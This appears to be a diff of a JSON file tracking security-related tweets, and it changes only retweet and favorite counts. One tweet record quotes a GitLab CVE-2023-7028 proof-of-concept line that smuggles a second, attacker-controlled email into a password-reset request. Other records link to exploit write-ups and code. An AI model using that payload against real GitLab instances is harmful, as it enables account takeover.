@@ -100,7 +100,7 @@
     "tweetfavorites": 0,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 111,
+    "tweetretweets": 115,
     "tweettext": "RT @standa_t: Write up of the HVCI bypass vuln (CVE-2024-21305) with @aall86 !\nhttps://t.co/dJiiEpvPh3 https://t.co/pbMjmuX6iG",
     "tweettime": "2024-01-17, 05:05:47",
     "tweeturl": "https://twitter.com/chompie1337/status/1747485342716883125",
@@ -502,7 +502,7 @@
     "expanded_url": [
         "https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/v8/CVE_2023_4069"
     ],
-    "tweetfavorites": 35,
+    "tweetfavorites": 36,
     "tweetquotes": 0,
     "tweetreplies": 3,
     "tweetretweets": 7,
@@ -603,7 +603,7 @@
     "tweetfavorites": 0,
     "tweetquotes": 0,
     "tweetreplies": 0,
-    "tweetretweets": 149,
+    "tweetretweets": 150,
     "tweettext": "RT @rwincey: GitLab CVE-2023-7028 POC\n\nuser[email][]=valid@email.com&amp;user[email][]=attacker@email.com \n\n- PWNED",
     "tweettime": "2024-01-12, 12:00:12",
     "tweeturl": "https://twitter.com/momika233/status/1745777697069150454",
